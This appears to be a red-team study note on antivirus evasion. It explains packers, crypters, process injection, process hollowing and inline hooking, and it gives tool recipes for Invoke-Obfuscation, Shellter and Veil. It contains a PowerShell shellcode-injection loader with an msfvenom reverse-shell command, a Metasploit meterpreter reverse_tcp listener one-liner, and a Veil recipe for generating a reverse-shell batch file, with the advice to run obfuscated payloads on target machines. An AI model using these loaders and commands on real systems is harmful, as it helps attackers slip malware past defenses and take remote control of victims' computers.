# Techniques (Theory)
## On-Disk Evasion
1) **Packers**
Given the high cost of disk space and slow network speeds during the early days of the internet, **packers** were originally designed to reduce the size of an executable. Unlike modern "zip" compression techniques, packers generate an executable that is not only smaller, but is also functionally equivalent with a completely new binary structure. The file produced has a new hash signature and as a result, can effectively bypass older and more simplistic AV scanners. Even though some modern malware uses a variation of this technique, the use of UPX and other popular packers alone is not sufficient to evade modern AV scanners.

2) **Obfuscators**
**Obfuscators** reorganize and mutate code in a way that makes it more difficult to reverse-engineer. This includes *replacing instructions with semantically equivalent ones, inserting irrelevant instructions or dead code, splitting or reordering functions*, and so on. Although primarily used by software developers to protect their intellectual property, this technique is also marginally effective against signature-based AV detection.

3) **Crypter**
Crypter software cryptographically alters executable code, adding a decryption stub that restores the original code upon execution. This decryption happens in-memory, leaving only the encrypted code on-disk. Encryption has become foundational in modern malware as one of the most effective AV evasion techniques.

Among commercially available tools, `The Enigma Protector` in particular can be used to successfully bypass antivirus products.


## In-Memory Evasion
1) **Remote Process Memory Injection**
inject the payload into another valid PE that is not malicious. The most common method of doing this is by leveraging a set of Windows APIs. First, we would use the `OpenProcess` function to obtain a valid `HANDLE` to a target process that we have permission to access. After obtaining the `HANDLE`, we would allocate memory in the context of that process by calling a Windows API such as `VirtualAllocEx`. Once the memory has been allocated in the remote process, we would copy the malicious payload to the newly allocated memory using `WriteProcessMemory`. After the payload has been successfully copied, it is usually executed in memory in a separate thread using the `CreateRemoteThread`API.

```powershell
# Basic code for Remote Process Memory Injection (Remove this comment & change variable names if necessary1)
$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];   
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
[Byte[]] $var1 = <place your shellcode here>

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

2) **Reflective DLL Injection**
Unlike regular DLL injection, which involves loading a malicious DLL from disk using the *LoadLibrary* API, the **Reflective DLL Injection** technique attempts to load a DLL stored by the attacker in the process memory.
The main challenge of implementing this technique is that *LoadLibrary* does not support loading a DLL from memory. Furthermore, the Windows operating system does not expose any APIs that can handle this either. Attackers who choose to use this technique must write their own version of the API that does not rely on a disk-based DLL.

3) **Process Handling**
When using **process hollowing** to bypass antivirus software, *attackers first launch a non-malicious process in a suspended state*. Once launched, the *image of the process is removed from memory and replaced with a malicious executable image*. Finally, the process is then resumed and malicious code is executed instead of the legitimate process.

4) **Inline Hooking**
**Inline hooking**, as the name suggests, involves modifying memory and introducing a *hook (an instruction that redirects the code execution)* into a function to make it point to our malicious code. Upon executing our malicious code, the flow will return back to the modified function and resume execution, appearing as if only the original code had executed. Used in rootkits.

---

![[Pasted image 20230129203220.png]]

# Elitewrap
An EXE wrapper, used to pack files into an archive executable that can extract and execute them in specified ways when the packfile is run.
![[Pasted image 20230204221410.png]]

---
# Invoke-Obfuscation
```powershell
# Initial setup (Everytime)
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation

# Set Scriptpath
SET SCRIPTPATH /root/DeepCytes/Red_Team/Invoke-Obfuscation/script.ps1

# Obfuscation technique that works!
AST
1
## Copy the payload and execute it in the target machine
```


# Shellter
![[Pasted image 20240617113951.png]]

![[Pasted image 20240617114028.png]]

```sh
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```


# Veil
[Installation Video](https://www.youtube.com/watch?v=tpJrnKEakW0)

### Create .bat reverse shell (Using PowerShell)
```sh
veil
use Evasion
use powershell/meterpreter/rev_tcp.py
# Set options
generate
```